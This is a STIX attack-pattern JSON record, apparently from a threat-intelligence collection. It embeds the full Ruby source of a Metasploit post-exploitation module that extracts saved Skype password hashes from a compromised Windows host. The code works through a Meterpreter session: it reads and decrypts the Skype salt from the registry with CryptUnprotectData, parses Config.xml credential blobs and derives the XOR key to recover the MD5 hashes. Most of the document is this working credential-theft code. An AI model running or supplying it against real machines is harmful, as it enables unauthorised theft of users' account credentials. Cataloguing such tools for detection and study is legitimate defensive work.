{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a46796ac-0f60-4cfc-9a69-60035e6d3e23",
    "created": "2024-08-14T16:33:08.230746Z",
    "modified": "2024-08-14T16:33:08.230752Z",
    "name": "Windows Gather Skype Saved Password Hash Extraction",
    "description": " This module finds saved login credentials for the Windows Skype client. The hash is in MD5 format that uses the username, a static string \"\\nskyper\\n\" and the password. The resulting MD5 is stored in the Config.xml file for the user after being XOR'd against a key generated by applying 2 SHA1 hashes of \"salt\" data which is stored in ProtectedStorage using the Windows API CryptProtectData against the MD5  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/credentials/skype.rb",
            "external_id": "skype.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.recon.cx/en/f/vskype-part2.pdf"
        },
        {
            "source_name": "reference",
            "url": "https://web.archive.org/web/20140207115406/http://insecurety.net/?p=427"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/skypeopensource/tools"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Post::Windows::Registry\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather Skype Saved Password Hash Extraction',\n        'Description' => %q{\n          This module finds saved login credentials\n          for the Windows Skype client. The hash is in MD5 format\n          that uses the username, a static string \"\\nskyper\\n\" and the\n          password. The resulting MD5 is stored in the Config.xml file\n          for the user after being XOR'd against a key generated by applying\n          2 SHA1 hashes of \"salt\" data which is stored in ProtectedStorage\n          using the Windows API CryptProtectData against the MD5\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'mubix', # module\n          'hdm' # crypto help\n        ],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'References' => [\n          ['URL', 'http://www.recon.cx/en/f/vskype-part2.pdf'],\n          ['URL', 'https://web.archive.org/web/20140207115406/http://insecurety.net/?p=427'],\n          ['URL', 'https://github.com/skypeopensource/tools']\n        ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_fs_ls\n              stdapi_railgun_api\n              stdapi_sys_process_attach\n              stdapi_sys_process_get_processes\n              stdapi_sys_process_getpid\n              stdapi_sys_process_memory_allocate\n              stdapi_sys_process_memory_read\n              stdapi_sys_process_memory_write\n            ]\n          }\n        }\n      )\n    )\n  end\n\n# To generate test hashes in ruby use:\n=begin\n\nrequire 'openssl'\n\nusername = \"test\"\npasssword = \"test\"\n\nhash = Digest::MD5.new\nhash.update username\nhash.update \"\\nskyper\\n\"\nhash.update password\n\nputs hash.hexdigest\n\n=end\n\n  def decrypt_reg(data)\n    pid = session.sys.process.getpid\n    process = session.sys.process.open(pid, PROCESS_ALL_ACCESS)\n    mem = process.memory.allocate(512)\n    process.memory.write(mem, data)\n\n    if session.sys.process.each_process.find { |i| i['pid'] == pid } ['arch'] == 'x86'\n      addr = [mem].pack('V')\n      len = [data.length].pack('V')\n      ret = session.railgun.crypt32.CryptUnprotectData(\"#{len}#{addr}\", 16, nil, nil, nil, 0, 8)\n      len, addr = ret['pDataOut'].unpack('V2')\n    else\n      # Convert using rex, basically doing: [mem & 0xffffffff, mem >> 32].pack(\"VV\")\n      addr = Rex::Text.pack_int64le(mem)\n      len = Rex::Text.pack_int64le(data.length)\n      ret = session.railgun.crypt32.CryptUnprotectData(\"#{len}#{addr}\", 16, nil, nil, nil, 0, 16)\n      pData = ret['pDataOut'].unpack('VVVV')\n      len = pData[0] + (pData[1] << 32)\n      addr = pData[2] + (pData[3] << 32)\n    end\n\n    return '' if len == 0\n\n    return process.memory.read(addr, len)\n  end\n\n  # Get the \"Salt\" unencrypted from the registry\n  def get_salt\n    print_status 'Checking for encrypted salt in the registry'\n    vprint_status 'Checking: HKCU\\\\Software\\\\Skype\\\\ProtectedStorage - 0'\n    rdata = registry_getvaldata('HKCU\\\\Software\\\\Skype\\\\ProtectedStorage', '0')\n    print_good('Salt found and decrypted')\n    return decrypt_reg(rdata)\n  end\n\n  # Pull out all the users in the AppData directory that have config files\n  def get_config_users(appdatapath)\n    users = []\n    dirlist = session.fs.dir.entries(appdatapath)\n    dirlist.shift(2)\n    dirlist.each do |dir|\n      if file?(appdatapath + \"\\\\#{dir}\" + '\\\\config.xml') == false\n        vprint_error \"Config.xml not found in #{appdatapath}\\\\#{dir}\\\\\"\n        next\n      end\n      print_good \"Found Config.xml in #{appdatapath}\\\\#{dir}\\\\\"\n      users << dir\n    end\n    return users\n  end\n\n  def parse_config_file(config_path)\n    hex = ''\n    configfile = read_file(config_path)\n    configfile.each_line do |line|\n      if line =~ /Credentials/i\n        hex = line.split('>')[1].split('<')[0]\n      end\n    end\n    return hex\n  end\n\n  def decrypt_blob(credhex, salt)\n    # Convert Config.xml hex to binary format\n    blob = [credhex].pack('H*')\n\n    # Concatinate SHA digests for AES key\n    sha = Digest::SHA1.digest(\"\\x00\\x00\\x00\\x00\" + salt) + Digest::SHA1.digest(\"\\x00\\x00\\x00\\x01\" + salt)\n\n    aes = OpenSSL::Cipher.new('AES-256-CBC')\n    aes.encrypt\n    aes.key = sha[0, 32] # Use only 32 bytes of key\n    final = aes.update([0].pack('N*') * 4) # Encrypt 16 \\x00 bytes\n    final << aes.final\n    xor_key = final[0, 16] # Get only the first 16 bytes of result\n\n    vprint_status(\"XOR Key: #{xor_key.unpack('H*')[0]}\")\n\n    decrypted = []\n\n    # Use AES/SHA crypto for XOR decoding\n    16.times do |i|\n      decrypted << (blob[i].unpack('C*')[0] ^ xor_key[i].unpack('C*')[0])\n    end\n\n    return decrypted.pack('C*').unpack('H*')[0]\n  end\n\n  def get_config_creds(salt)\n    users = []\n    appdatapath = expand_path('%AppData%') + '\\\\Skype'\n    print_status('Checking for config files in %APPDATA%')\n    users = get_config_users(appdatapath)\n    if users.any?\n      users.each do |user|\n        print_status(\"Parsing #{appdatapath}\\\\#{user}\\\\Config.xml\")\n        credhex = parse_config_file(\"#{appdatapath}\\\\#{user}\\\\config.xml\")\n        if credhex == ''\n          print_error(\"No Credentials3 blob found for #{user} in Config.xml skipping\")\n          next\n        else\n          hash = decrypt_blob(credhex, salt)\n          print_good \"Skype MD5 found: #{user}:#{hash}\"\n        end\n      end\n    else\n      print_error 'No users with configs found. Exiting'\n    end\n  end\n\n  def run\n    salt = get_salt\n    if !salt.nil?\n      creds = get_config_creds(salt)\n    else\n      print_error 'No salt found. Cannot continue without salt, exiting'\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}